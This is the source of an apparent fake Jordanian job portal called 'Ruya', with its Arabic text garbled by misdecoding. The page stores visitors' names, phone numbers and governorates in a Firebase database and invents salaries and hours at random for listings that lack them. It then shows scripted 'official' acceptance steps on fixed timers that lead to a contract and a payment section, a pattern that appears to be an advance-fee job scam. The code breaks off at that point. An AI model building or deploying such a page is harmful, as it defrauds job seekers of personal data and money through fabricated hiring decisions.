<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>Ø¨ÙˆØ§Ø¨Ø© ÙˆØ¸Ø§Ø¦Ù Ø±Ø¤ÙŠØ§ | Ø§Ù„Ø£Ø±Ø¯Ù†</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="theme-color" content="#4b1979">
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700&display=swap" rel="stylesheet">
  <link rel="icon" href="https://www2.0zz0.com/2025/10/15/20/337819623.png">
  <style>
    :root {
      --purple: #4b1979;
      --purple-grad: linear-gradient(90deg, #7f38c0 0%, #4b1979 100%);
      --purple-btn: linear-gradient(90deg, #a259c4 0%, #7f38c0 100%);
      --white: #fff;
      --gray: #f8f6fa;
      --green: #39bb6c;
      --gold: #b88f27;
      --danger: #e6415d;
      --shadow: 0 8px 32px #4b19791a;
    }
    body {
      font-family: 'Cairo', Arial, sans-serif;
      margin: 0; background: var(--gray);
      min-height: 100vh; color: var(--purple);
    }
    header {
      background: var(--purple);
      color: var(--white);
      text-align: center;
      padding: 38px 10px 16px;
      position: relative;
      box-shadow: 0 2px 24px #4b197918;
    }
    header img {
      width: 70px; height: 70px;
      display: block; margin: 0 auto 10px;
      border-radius: 16px; background: #fff;
      border: 3px solid #fff; box-shadow: var(--shadow);
    }
    header h1 {
      font-size: 2.1rem; font-weight: 900;
      margin: 8px 0 7px 0; letter-spacing: 0.8px;
    }
    header p {
      font-size: 1.09rem; margin: 0; color: #f6e7ff;
    }
    .main-section {
      max-width: 900px;
      margin: 0 auto; padding: 36px 9px 44px 9px;
    }
    .main-section h2 {
      text-align: center; color: var(--purple);
      font-size: 1.35rem; font-weight: 900;
      margin-bottom: 24px;
    }
    .jobs-list {
      display: grid; grid-template-columns: 1fr 1fr 1fr;
      gap: 24px;
    }
    @media (max-width:900px) { .jobs-list { grid-template-columns: 1fr 1fr; } }
    @media (max-width:600px) { .jobs-list { grid-template-columns: 1fr; } }
    .job-card {
      background: #fff;
      border-radius: 15px;
      box-shadow: var(--shadow);
      padding: 23px 19px 18px 19px;
      border: 1.6px solid #e5d2f5;
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      gap: 7px;
      position: relative;
      transition: box-shadow .2s, border .18s;
    }
    .job-card:hover {
      box-shadow: 0 8px 32px #7f38c044;
      border-color: #7f38c0;
    }
    .job-emoji {
      font-size: 2.3rem;
      margin-bottom: 6px;
    }
    .job-title {
      font-size: 1.18rem;
      font-weight: 900;
      color: var(--purple);
      margin-bottom: 4px;
    }
    .job-meta {
      font-size: 1.02rem;
      color: #6642a6;
      font-weight: 700;
      margin-bottom: 5px;
      display: flex; flex-wrap: wrap; gap: 12px;
    }
    .job-salary {
      color: var(--green);
      font-size: 1.04rem;
      font-weight: 900;
    }
    .job-hours {
      color: #b88f27;
      font-size: .99rem;
      font-weight: 700;
    }
    .job-location {
      font-size: .98rem;
      color: #4b1979;
      font-weight: 700;
    }
    .job-actions {
      margin-top: 11px;
      width: 100%;
      display: flex; justify-content: center;
    }
    .job-actions button {
      background: var(--purple-btn);
      color: #fff;
      border: none;
      padding: 8px 0;
      min-width: 120px;
      border-radius: 14px;
      font-size: 1.07rem;
      font-weight: 700;
      cursor: pointer;
      box-shadow: 0 2px 12px #7f38c034;
      transition: background .2s;
    }
    .job-actions button:active {background: var(--purple);}
    /* Modal Styles */
    .modal-backdrop {
      display: none;
      position: fixed;
      z-index: 9999;
      top: 0; left: 0; width: 100vw; height: 100vh;
      background: #2a003b90;
      justify-content: center;
      align-items: center;
    }
    .modal {
      background: #fff;
      border-radius: 28px;
      box-shadow: var(--shadow);
      padding: 38px 22px 32px 22px;
      max-width: 390px;
      width: 94vw;
      text-align: center;
      position: relative;
      animation: modalIn 0.5s;
    }
    @keyframes modalIn {
      from { transform: translateY(-80px) scale(.95); opacity:0;}
      to { transform: none; opacity:1;}
    }
    .modal h2 {
      color: var(--purple);
      font-size: 1.41rem;
      font-weight: 900;
      margin: 0 0 7px 0;
    }
    .modal .modal-sub {
      color: var(--gold);
      font-size: 1.08rem;
      margin-bottom: 17px;
      letter-spacing: .3px;
      font-weight: 600;
    }
    .modal input, .modal select {
      width: 100%;
      padding: 13px 11px;
      margin-bottom: 18px;
      background: #fff;
      border: 1.6px solid #d0b8e4;
      border-radius: 9px;
      font-size: 1.09rem;
      font-family: inherit;
      outline: none;
      transition: border .2s;
      box-sizing: border-box;
    }
    .modal input:focus, .modal select:focus {
      border-color: #7f38c0;
    }
    .modal select {
      color: #7f38c0;
      font-weight: 700;
    }
    .modal button {
      background: var(--purple-btn);
      color: #fff;
      border: none;
      padding: 11px 0;
      width: 100%;
      border-radius: 14px;
      font-size: 1.12rem;
      font-weight: 700;
      cursor: pointer;
      margin-top: 7px;
      box-shadow: 0 3px 16px #7f38c034;
      transition: background .2s;
    }
    .modal button:active {
      background: var(--purple);
    }
    .modal .notice {
      color: var(--danger);
      font-size: 1.07rem;
      font-weight: 700;
      margin-top: 7px;
      margin-bottom: 0;
    }
    /* Ø®Ø·ÙˆØ§Øª Ø§Ù„ØªÙˆØ¸ÙŠÙ */
    .steps-section {
      background: #fff;
      border-radius: 22px;
      box-shadow: var(--shadow);
      margin: 30px auto 30px auto;
      max-width: 540px;
      padding: 27px 16px 18px 16px;
      text-align: center;
      display: none;
      animation: stepIn 0.5s;
    }
    @keyframes stepIn {
      from { transform: scale(.9); opacity:0;}
      to { transform: none; opacity:1;}
    }
    .steps-section.active {display: block;}
    .steps-section h2 {
      color: var(--purple);
      font-size: 1.19rem;
      font-weight: 900;
      margin-bottom: 15px;
    }
    .step {
      margin: 0 auto 17px auto;
      background: #f6f1fb;
      border-radius: 14px;
      border: 1.2px solid #e5d2f5;
      padding: 14px 12px 8px 12px;
      font-size: 1.07rem;
      color: #4b1979;
      font-weight: 700;
      position: relative;
      box-shadow: 0 3px 16px #7f38c018;
      animation: stepPop .8s;
      text-align: right;
    }
    @keyframes stepPop {
      from { transform: translateY(50px) scale(.96); opacity:0;}
      to { transform: none; opacity:1;}
    }
    .step.done {
      border-color: var(--green);
      background: #e4fbe8;
      color: var(--green);
    }
    .step.waiting {
      color: #b88f27;
      border-color: #f3e2c5;
      background: #fffbea;
    }
    .step .loader {
      display: inline-block;
      width: 19px; height: 19px;
      border: 3px solid #b88f27;
      border-top: 3px solid #fff;
      border-radius: 50%;
      margin-left: 7px;
      vertical-align: -4px;
      animation: spin 1.1s linear infinite;
    }
    @keyframes spin { 100% { transform: rotate(360deg);} }
    /* Ø§Ù„Ø¹Ù‚Ø¯ */
    .contract-section {
      background: #fff;
      border-radius: 22px;
      box-shadow: var(--shadow);
      margin: 30px auto 30px auto;
      max-width: 540px;
      padding: 24px 16px 18px 16px;
      text-align: center;
      display: none;
    }
    .contract-section.active {display:block;}
    .contract-h {
      color: var(--purple);
      font-size: 1.15rem;
      font-weight: 900;
      margin-bottom: 15px;
      text-align: center;
    }
    .contract-table {
      width: 100%; border-collapse:collapse;
      margin: 0 auto 18px auto; background: #f6f1fb;
      border-radius: 9px; overflow: hidden;
      box-shadow: 0 3px 16px #7f38c018;
    }
    .contract-table th, .contract-table td {
      border:1px solid #e5d2f5; padding:10px 8px; font-size:1.07rem;
    }
    .contract-table th { background:#f0e8fa; color:var(--purple);}
    .contract-table td { background:#fff;}
    .contract-row-title {width: 38%;}
    .contract-row-val   {width: 62%; font-weight: 700;}
    .contract-agree {
      margin-top: 19px; color: #555; font-size:1.06rem; text-align:right;
    }
    .contract-footer {
      margin-top: 23px; color: #888; font-size:0.97rem;
      text-align: center;
    }
    .contract-img-btn {
      display: block; width:100%; margin:12px 0 0 0;
      background: var(--purple-btn); color:#fff; border:none;
      border-radius:14px; padding:9px 0; font-size:1.09rem;
      font-weight: 700; cursor:pointer; box-shadow:0 2px 12px #7f38c034;
    }
    /* Ø§Ù„Ø¯ÙØ¹ */
    .payment-section {
      background: #fff;
      border-radius: 22px;
      box-shadow: var(--shadow);
      margin: 30px auto 30px auto;
      max-width: 540px;
      padding: 28px 11px 18px 11px;
      text-align: center;
      display: none;
    }
    .payment-section.active {display:block;}
    .payment-title {
      color: var(--purple);
      font-size: 1.13rem;
      font-weight: 900;
      margin-bottom: 12px;
    }
    .payment-list {
      text-align: right;
      margin: 0 0 13px 0;
      color: #4b1979;
    }
    .payment-total {
      color: #b88f27;
      font-size: 1.13rem;
      font-weight: 800;
      margin-bottom: 11px;
      margin-top: 12px;
    }
    .payment-instructions {
      color: #444;
      font-size: 1.05rem;
      margin-bottom: 12px;
    }
    .payment-steps {
      color: #888;
      font-size: .97rem;
    }
    .paid-btn, .cancel-btn, .again-btn {
      display: inline-block;
      margin: 7px 4px;
      padding: 8px 20px;
      border-radius: 12px;
      border: none;
      font-size: 1.07rem;
      font-weight: 700;
      cursor: pointer;
      background: var(--purple-btn);
      color: #fff;
      box-shadow: 0 2px 12px #7f38c034;
      transition: background .2s;
    }
    .paid-btn:active, .again-btn:active {background: var(--purple);}
    .cancel-btn {
      background: #e6415d;
      color: #fff;
      margin-left: 8px;
    }
    .cancel-btn:active {background: #b21f3d;}
    .info-message {
      color: var(--green);
      font-weight: 900;
      margin-bottom: 7px;
      font-size: 1.11rem;
      letter-spacing: .2px;
    }
    .pending-message {
      color: #b88f27;
      font-size: 1.05rem;
      font-weight: 700;
      margin-bottom: 8px;
    }
    /* Ø¥Ø´Ø¹Ø§Ø±Ø§Øª */
    .notify {
      position: fixed;
      top: 20px;
      right: 50%;
      transform: translateX(50%);
      background: var(--purple-btn);
      color: #fff;
      padding: 16px 42px;
      border-radius: 18px;
      font-size: 1.13rem;
      font-weight: 700;
      box-shadow: 0 2px 16px #7f38c044;
      z-index: 99999;
      display: none;
      animation: fadeIn .5s;
    }
    @keyframes fadeIn {
      from { opacity:0; top:10px;}
      to { opacity:1; top:20px;}
    }
    /* Ø²Ø± ÙˆØ§ØªØ³Ø§Ø¨ */
    .whatsapp-btn {
      position: fixed; bottom: 24px; left: 24px;
      z-index: 9999;
      background: #25d366;
      color: #fff; border:none; border-radius:50%;
      width: 61px; height: 61px;
      display: flex; align-items: center; justify-content: center;
      box-shadow: 0 2px 12px #25d36644;
      cursor: pointer;
      font-size: 2.45rem;
      transition: box-shadow .2s, background .2s;
    }
    .whatsapp-btn:hover {background:#128c7e;}
    @media (max-width:600px) {
      header h1 { font-size: 1.2rem;}
      .main-section { padding: 17px 2vw 22px 2vw;}
      .modal { padding: 20px 5vw 15px 5vw;}
      .steps-section, .contract-section, .payment-section {padding: 13px 3vw 13px 3vw;}
      .jobs-list { grid-template-columns: 1fr;}
      .whatsapp-btn { left: 12px; bottom: 12px; width: 48px; height: 48px; font-size: 1.6rem;}
    }
    ::-webkit-scrollbar { width: 8px;}
    ::-webkit-scrollbar-thumb { background: #7f38c034; border-radius: 6px;}
    ::selection { background: #7f38c022; }
  </style>
</head>
<body>
  <header>
    <img src="https://www2.0zz0.com/2025/10/15/20/337819623.png" alt="Ø´Ø¹Ø§Ø± Ø±Ø¤ÙŠØ§">
    <h1>Ø¨ÙˆØ§Ø¨Ø© ÙˆØ¸Ø§Ø¦Ù Ø±Ø¤ÙŠØ§</h1>
    <p>Ø§Ù„Ø¨ÙˆØ§Ø¨Ø© Ø§Ù„Ø±Ø³Ù…ÙŠØ© Ù„Ø¬Ù…ÙŠØ¹ Ø§Ù„ÙˆØ¸Ø§Ø¦Ù ÙÙŠ Ø§Ù„Ø£Ø±Ø¯Ù†</p>
  </header>
  <section class="main-section" id="mainSection">
    <h2>Ø§Ø®ØªØ± Ø§Ù„ÙˆØ¸ÙŠÙØ© Ø§Ù„Ø£Ù†Ø³Ø¨ Ù„Ùƒ Ø­Ø³Ø¨ Ù…Ø­Ø§ÙØ¸ØªÙƒ</h2>
    <div id="jobs" class="jobs-list"></div>
  </section>
  <!-- Ù†Ø§ÙØ°Ø© ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… -->
  <div id="modalBackdrop" class="modal-backdrop">
    <div class="modal">
      <h2>ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</h2>
      <div class="modal-sub">ÙŠØ±Ø¬Ù‰ ØªØ¹Ø¨Ø¦Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù…ØªØ§Ø¨Ø¹Ø© Ø§Ù„ØªÙ‚Ø¯ÙŠÙ… Ø¹Ù„Ù‰ Ø§Ù„ÙˆØ¸Ø§Ø¦Ù</div>
      <form id="userForm" autocomplete="off">
        <input required type="text" id="username" name="username" placeholder="Ø§Ù„Ø§Ø³Ù… Ø§Ù„ÙƒØ§Ù…Ù„">
        <input required type="tel" id="phone" name="phone" pattern="^07[789][0-9]{7}$" maxlength="10" placeholder="Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ">
        <select required id="governorate" name="governorate">
          <option value="">Ø§Ø®ØªØ± Ø§Ù„Ù…Ø­Ø§ÙØ¸Ø©</option>
          <option>Ø¹Ù…Ø§Ù†</option><option>Ø¥Ø±Ø¨Ø¯</option><option>Ø§Ù„Ø²Ø±Ù‚Ø§Ø¡</option>
          <option>Ø§Ù„Ø¹Ù‚Ø¨Ø©</option><option>Ø¬Ø±Ø´</option><option>Ø§Ù„Ù…ÙØ±Ù‚</option>
          <option>Ø¹Ø¬Ù„ÙˆÙ†</option><option>Ø§Ù„Ø¨Ù„Ù‚Ø§Ø¡</option><option>Ù…Ø¹Ø§Ù†</option>
          <option>Ø§Ù„ÙƒØ±Ùƒ</option><option>Ù…Ø§Ø¯Ø¨Ø§</option><option>Ø§Ù„Ø·ÙÙŠÙ„Ø©</option>
        </select>
        <button type="submit">Ø¯Ø®ÙˆÙ„</button>
      </form>
      <div class="notice" id="modalNotice"></div>
    </div>
  </div>
  <!-- Ø¥Ø¬Ø±Ø§Ø¡Ø§Øª Ø§Ù„ØªÙˆØ¸ÙŠÙ -->
  <div class="steps-section" id="stepsSection"></div>
  <!-- Ø§Ù„Ø¹Ù‚Ø¯ -->
  <div class="contract-section" id="contractSection"></div>
  <!-- Ø§Ù„Ø¯ÙØ¹ -->
  <div class="payment-section" id="paymentSection"></div>
  <!-- Ø¥Ø´Ø¹Ø§Ø± -->
  <div class="notify" id="notify"></div>
  <!-- Ø²Ø± ÙˆØ§ØªØ³Ø§Ø¨ -->
  <a id="whatsappBtn" class="whatsapp-btn" href="#" target="_blank" title="ØªÙˆØ§ØµÙ„ Ù…Ø¹Ù†Ø§ Ø¹Ø¨Ø± ÙˆØ§ØªØ³Ø§Ø¨"><span>ğŸŸ¢</span></a>
  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <!-- html2canvas Ù„ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ø¹Ù‚Ø¯ Ù„ØµÙˆØ±Ø© -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
  <script>
    // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Firebase
    const firebaseConfig = {
      apiKey: "AIzaSyCtvxXiWWZ4GxWxz1rAhu9nRwiFlkiKMtA",
      authDomain: "royanew-a02f3.firebaseapp.com",
      projectId: "royanew-a02f3",
      storageBucket: "royanew-a02f3.appspot.com",
      messagingSenderId: "640968299159",
      appId: "1:640968299159:web:590e4256ad1492ca19cfd2",
      measurementId: "G-69TLG6LYYK",
      databaseURL: "https://royanew-a02f3-default-rtdb.firebaseio.com"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // Ø¬Ù„Ø¨ Ø±Ù‚Ù… ÙˆØ§ØªØ³Ø§Ø¨ Ù…Ù† Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
    let whatsappNum = "";
    function updateWhatsappBtn() {
      let btn = document.getElementById('whatsappBtn');
      if(whatsappNum){
        btn.href = "https://wa.me/"+whatsappNum.replace(/[^0-9]/g,"");
        btn.innerHTML = '<svg width="32" height="32" viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#25d366"/><path d="M23.6 19.8c-.3-.1-1.6-.8-1.9-.9-.3-.1-.5-.2-.7.2-.2.3-.7.9-.9 1.1-.2.2-.4.2-.7.1-.3-.1-1.2-.4-2.4-1.3-.9-.7-1.6-1.6-1.8-1.9-.2-.3 0-.5.1-.7.1-.1.3-.4.4-.6.1-.1.1-.2.2-.4s.1-.3 0-.5c-.1-.2-.7-1.7-1-2.3-.3-.6-.6-.5-.8-.5-.2 0-.4 0-.7.1-.3.1-.7.4-1 .8C8.4 14.8 8.1 15.2 8.1 16c0 .8.3 1.5.7 2.1.7 1.4 2.5 3.5 4.7 4.3.7.2 1.4.3 2 .2.6-.1 1.8-.7 2.1-1.3.3-.6.3-1.2.2-1.4z" fill="#fff"/></svg>';
      }else{
        btn.href="#";
        btn.innerHTML = "ÙˆØ§ØªØ³Ø§Ø¨";
      }
    }
    db.ref("settings/whatsapp").on("value", snap=>{
      whatsappNum = snap.val()||"0790000000";
      updateWhatsappBtn();
    });

    // Ø¥Ø´Ø¹Ø§Ø±
    function notify(msg, time=2600) {
      let n = document.getElementById('notify');
      n.innerText = msg;
      n.style.display = 'block';
      setTimeout(()=>{ n.style.display = 'none'; }, time);
    }

    // Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ù† LocalStorage
    function getUserData() {
      try {return JSON.parse(localStorage.getItem('ruya_user')) || null;}
      catch {return null;}
    }
    function setUserData(data) {
      localStorage.setItem('ruya_user', JSON.stringify(data));
    }
    function clearUserData() {
      localStorage.removeItem('ruya_user');
      localStorage.removeItem('ruya_request');
    }

    // Ø­Ø§Ù„Ø© Ø§Ù„Ø·Ù„Ø¨ (Ø§Ù„Ø¯ÙØ¹ ÙˆØºÙŠØ±Ù‡)
    function getRequestData() {
      try {return JSON.parse(localStorage.getItem('ruya_request')) || null;}
      catch {return null;}
    }
    function setRequestData(data) {
      localStorage.setItem('ruya_request', JSON.stringify(data));
    }
    function clearRequestData() {
      localStorage.removeItem('ruya_request');
    }

    // Ù†Ø§ÙØ°Ø© Ø§Ù„ØªØ³Ø¬ÙŠÙ„
    const modalBackdrop = document.getElementById('modalBackdrop');
    const userForm = document.getElementById('userForm');
    const modalNotice = document.getElementById('modalNotice');

    function showModal() { modalBackdrop.style.display = "flex";}
    function hideModal() { modalBackdrop.style.display = "none";}

    // Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
    window.onload = function() {
      let user = getUserData();
      let req = getRequestData();
      if (!user) {
        showModal();
        hideAllSections();
      } else if(req && req.status!=="done") {
        hideAllSections();
        handleRequestFlow(req);
      } else {
        hideAllSections();
        document.getElementById('mainSection').style.display = "block";
        loadJobs();
      }
    };

    // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
    userForm.onsubmit = function(e) {
      e.preventDefault();
      let username = userForm.username.value.trim();
      let phone = userForm.phone.value.trim();
      let governorate = userForm.governorate.value;
      if (!username || !phone.match(/^07[789][0-9]{7}$/) || !governorate) {
        modalNotice.innerText = 'ÙŠØ±Ø¬Ù‰ ØªØ¹Ø¨Ø¦Ø© Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ø´ÙƒÙ„ ØµØ­ÙŠØ­';
        return;
      }
      let userObj = { username, phone, governorate, timestamp: Date.now() };
      db.ref('users').push(userObj).then(() => {
        setUserData(userObj);
        hideModal();
        notify('ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¨Ù†Ø¬Ø§Ø­');
        document.getElementById('mainSection').style.display = "block";
        loadJobs();
      }).catch(()=>{modalNotice.innerText = 'Ø­Ø¯Ø« Ø®Ø·Ø£. Ø­Ø§ÙˆÙ„ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰';});
    };

    // Ø¥ÙŠÙ…ÙˆØ¬ÙŠ Ø§Ù„ÙˆØ¸Ø§Ø¦Ù
    function jobEmoji(title) {
      const map = {
        "Ù…Ø­Ø§Ø³Ø¨":"ğŸ’¼", "Ø¹Ø§Ù…Ù„":"ğŸ”§", "Ø³Ø§Ø¦Ù‚":"ğŸš—", "Ù…Ø¹Ù„Ù…":"ğŸ“š", "Ù…Ø¯Ø±Ø³":"ğŸ“š", "ÙÙ†ÙŠ":"ğŸ› ï¸",
        "Ù…Ù‡Ù†Ø¯Ø³":"ğŸ§‘â€ğŸ’»", "Ø·Ø¨ÙŠØ¨":"ğŸ©º", "Ù…Ù…Ø±Ø¶":"ğŸ’‰", "Ù…Ù†Ø¯ÙˆØ¨":"ğŸ§‘â€ğŸ’¼", "Ø³ÙƒØ±ØªÙŠØ±Ø©":"ğŸ—‚ï¸",
        "Ø®Ø¯Ù…Ø©":"ğŸ™‹â€â™‚ï¸", "ÙƒØ§Ø´ÙŠØ±":"ğŸ§¾", "Ø´ÙŠÙ":"ğŸ‘¨â€ğŸ³", "Ù†Ø¸Ø§ÙØ©":"ğŸ§¹", "Ù…Ø±Ø§Ù‚Ø¨":"ğŸ•µï¸â€â™‚ï¸",
        "ØªØ³ÙˆÙŠÙ‚":"ğŸ“ˆ", "Ù…ØµÙ…Ù…":"ğŸ¨", "Ø´Ø¨ÙƒØ§Øª":"ğŸŒ", "Ù…Ø·ÙˆØ±":"ğŸ‘¨â€ğŸ’»", "Ø§Ø³ØªÙ‚Ø¨Ø§Ù„":"ğŸ‘‹",
        "Ø¥Ø¯Ø§Ø±ÙŠ":"ğŸ–‡ï¸", "Ù…Ø¨ÙŠØ¹Ø§Øª":"ğŸ’°", "Ù…ÙˆØ§Ø±Ø¯":"ğŸ§‘â€ğŸ’¼", "Ù…Ø¯ÙŠØ±":"ğŸ§‘â€ğŸ’¼", "Ù…Ø­Ø§Ù…ÙŠ":"âš–ï¸"
      };
      for(let key in map){
        if(title.includes(key)) return map[key];
      }
      return "ğŸ’¼";
    }

    // ØªØ­Ù…ÙŠÙ„ Ø§Ù„ÙˆØ¸Ø§Ø¦Ù Ù…Ù† Firebase
    function loadJobs() {
      let jobsDiv = document.getElementById('jobs');
      jobsDiv.innerHTML = '<div style="color:#aaa;text-align:center;">Ø¬Ø§Ø±Ù Ø§Ù„ØªØ­Ù…ÙŠÙ„...</div>';
      db.ref('jobs').orderByChild('timestamp').limitToLast(500).once('value', (snap) => {
        let jobs = [];
        snap.forEach(child => {
          let job = child.val();
          jobs.unshift({id:child.key, ...job});
        });
        if (jobs.length === 0) {
          jobsDiv.innerHTML = '<div style="color:#4b1979;text-align:center;font-size:1.12rem;">Ù„Ø§ ØªÙˆØ¬Ø¯ ÙˆØ¸Ø§Ø¦Ù Ø­Ø§Ù„ÙŠØ§Ù‹</div>';
          return;
        }
        let user = getUserData();
        jobsDiv.innerHTML = "";
        jobs.forEach(job => {
          // Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ù…Ø­Ø§ÙØ¸Ø© Ø§Ù„Ù…Ø®ØªØ§Ø±Ø© ÙÙ‚Ø· Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù…
          let salary = job.salary? job.salary : getLogicalSalary(job.title);
          let hours = job.hours? job.hours : getLogicalHours(job.title);
          jobsDiv.innerHTML += `
            <div class="job-card" data-id="${job.id}">
              <div class="job-emoji">${job.emoji||jobEmoji(job.title||"")}</div>
              <div class="job-title">${job.title}</div>
              <div class="job-meta">
                <span class="job-salary">Ø§Ù„Ø±Ø§ØªØ¨: ${salary} Ø¯.Ø£</span>
                <span class="job-hours">Ø³Ø§Ø¹Ø§Øª Ø§Ù„Ø¹Ù…Ù„: ${hours} Ø³Ø§Ø¹Ø§Øª</span>
                <span class="job-location">Ø§Ù„Ù…Ø­Ø§ÙØ¸Ø©: ${user.governorate}</span>
              </div>
              <div class="job-actions">
                <button onclick="applyJob('${job.id}')">Ø§Ø®ØªÙŠØ§Ø± Ø§Ù„ÙˆØ¸ÙŠÙØ©</button>
              </div>
            </div>
          `;
        });
      });
    }
    // Ø±Ø§ØªØ¨ Ù…Ù†Ø·Ù‚ÙŠ Ø­Ø³Ø¨ Ø§Ù„Ù…Ø³Ù…Ù‰
    function getLogicalSalary(title){
      title = title||"";
      if(title.includes("Ù…Ø¯ÙŠØ±") || title.includes("Ù…Ø­Ù„Ù„") || title.includes("Ù…Ù‡Ù†Ø¯Ø³") || title.includes("Ø·Ø¨ÙŠØ¨")) return rand(900,1500);
      if(title.includes("Ù…Ø¹Ù„Ù…") || title.includes("Ù…Ù…Ø±Ø¶") || title.includes("Ù…Ø­Ø§Ø³Ø¨") || title.includes("Ù…Ø·ÙˆØ±")) return rand(650,950);
      if(title.includes("Ø¹Ø§Ù…Ù„") || title.includes("Ø³Ø§Ø¦Ù‚") || title.includes("ÙÙ†ÙŠ")) return rand(550,800);
      return rand(550,900);
    }
    function rand(a,b){ return Math.floor(Math.random()*(b-a+1))+a; }
    // Ø³Ø§Ø¹Ø§Øª Ù…Ù†Ø·Ù‚ÙŠØ© Ø­Ø³Ø¨ Ø§Ù„ÙˆØ¸ÙŠÙØ©
    function getLogicalHours(title){
      if(title.includes("Ù…Ø¯ÙŠØ±")||title.includes("Ù…Ø­Ù„Ù„")) return 8;
      if(title.includes("Ø¹Ø§Ù…Ù„")||title.includes("Ø³Ø§Ø¦Ù‚")) return 9;
      return [7,8,9,10][Math.floor(Math.random()*4)];
    }

    // Ø§Ù„ØªÙ‚Ø¯ÙŠÙ… Ø¹Ù„Ù‰ ÙˆØ¸ÙŠÙØ©
    function applyJob(jobId) {
      let user = getUserData();
      if (!user) { showModal(); return; }
      let req = getRequestData();
      if (req && req.status!=="done") {
        notify('Ù„Ø¯ÙŠÙƒ Ø·Ù„Ø¨ Ø¬Ø§Ø±ÙŠ Ø¨Ø§Ù„ÙØ¹Ù„! Ø£ÙƒÙ…Ù„ Ø§Ù„Ø¥Ø¬Ø±Ø§Ø¡Ø§Øª Ø£Ùˆ Ø£Ù„ØºÙ Ø§Ù„Ø·Ù„Ø¨.');
        return;
      }
      db.ref('jobs/'+jobId).once('value').then(snap=>{
        let job = snap.val();
        if (!job) { notify('Ø­Ø¯Ø« Ø®Ø·Ø£'); return; }
        let salary = job.salary? job.salary : getLogicalSalary(job.title);
        let hours = job.hours? job.hours : getLogicalHours(job.title);
        let emoji = job.emoji||jobEmoji(job.title||"");
        let request = {
          user, jobId, jobTitle:job.title, salary, hours, location:user.governorate, emoji,
          status: "steps", step: 0, paid: false
        };
        setRequestData(request);
        hideAllSections();
        handleRequestFlow(request);
      });
    }

    // Ø®Ø·ÙˆØ§Øª Ø±Ø³Ù…ÙŠØ© ÙˆØ§Ù‚Ø¹ÙŠØ©
    const steps = [
      {txt:'ØªÙ… Ø§Ø³ØªÙ„Ø§Ù… Ø·Ù„Ø¨ Ø§Ù„ØªÙˆØ¸ÙŠÙ Ø¨Ù†Ø¬Ø§Ø­ ÙˆÙŠØ¬Ø±ÙŠ Ø§Ù„Ø¢Ù† ØªØ¯Ù‚ÙŠÙ‚ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø±Ø³Ù…ÙŠØ§Ù‹.', time:3000, class:'done'},
      {txt:'ØªÙ…Øª Ù…Ø±Ø§Ø¬Ø¹Ø© Ø·Ù„Ø¨Ùƒ Ù…Ù† Ù‚Ø¨Ù„ Ù„Ø¬Ù†Ø© Ø§Ù„ØªÙˆØ¸ÙŠÙØŒ ÙˆØ¬Ø§Ø±ÙŠ Ù…Ø·Ø§Ø¨Ù‚Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø¹ Ù…ØªØ·Ù„Ø¨Ø§Øª Ø§Ù„ÙˆØ¸ÙŠÙØ©.', time:3000, class:'waiting'},
      {txt:'ØªÙ… Ù‚Ø¨ÙˆÙ„Ùƒ Ù…Ø¨Ø¯Ø¦ÙŠÙ‹Ø§ ÙÙŠ Ø§Ù„ÙˆØ¸ÙŠÙØ©ØŒ ÙˆØ³ÙŠØªÙ… Ø¥Ø¹Ø¯Ø§Ø¯ Ø¹Ù‚Ø¯ Ø¹Ù…Ù„ Ø±Ø³Ù…ÙŠ Ø¨Ø§Ø³Ù…Ùƒ.', time:3000, class:'done'},
      {txt:'ÙŠØªÙ… Ø§Ù„Ø¢Ù† ØªØ¬Ù‡ÙŠØ² Ø§ØªÙØ§Ù‚ÙŠØ© Ø§Ù„Ø¹Ù…Ù„ Ø§Ù„Ø±Ø³Ù…ÙŠØ© ÙˆØ§Ù„Ø¥Ø¬Ø±Ø§Ø¡Ø§Øª Ø§Ù„Ø¥Ø¯Ø§Ø±ÙŠØ© Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠØ©.', time:3000, class:'waiting'}
    ];

    function handleRequestFlow(req) {
      if (req.status === "steps") {
        document.getElementById('stepsSection').innerHTML = '';
        showSection('stepsSection');
        showSteps(req, 0);
      } else if (req.status === "contract") {
        showSection('contractSection');
        showContract(req);
      } else if (req.status === "payment") {
        showSection('paymentSection');
        showPayment(req);
      } else if (req.status === "pending") {
        showSection('paymentSection');
        showPendingPayment(req);
      } else if (req.status === "done") {
        clearRequestData();
        notify('ØªÙ… ØªÙˆØ¸ÙŠÙÙƒ Ø¨Ù†Ø¬Ø§Ø­!');
        document.getElementById('mainSection').style.display = "block";
        loadJobs();
      }
    }
    function showSteps(req, idx) {
